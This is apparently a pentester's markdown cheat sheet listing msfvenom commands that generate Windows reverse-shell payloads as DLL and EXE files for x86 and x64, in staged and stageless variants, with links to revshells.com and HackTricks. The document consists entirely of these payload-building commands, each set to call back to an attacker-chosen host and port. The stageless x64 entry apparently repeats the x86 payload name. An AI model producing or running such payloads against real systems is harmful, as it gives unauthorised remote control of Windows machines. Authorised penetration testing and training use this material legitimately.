### :open_file_folder: Reference resources

https://www.revshells.com/

https://book.hacktricks.xyz/shells/shells/msfvenom

### :open_file_folder: Windows

- dll

x86(try first)

```
msfvenom -p windows/shell_reverse_tcp -f dll -o xxx.dll LHOST=<IP> LPORT=<PORT>
```

x64

```
msfvenom -p windows/x64/shell_reverse_tcp -f dll -o xxx.dll LHOST=<IP> LPORT=<PORT>
```

- exe

Staged Payloads for Windows

x86

```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

x64

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

Stageless Payloads for Windows(try first)

x86

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

x64

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

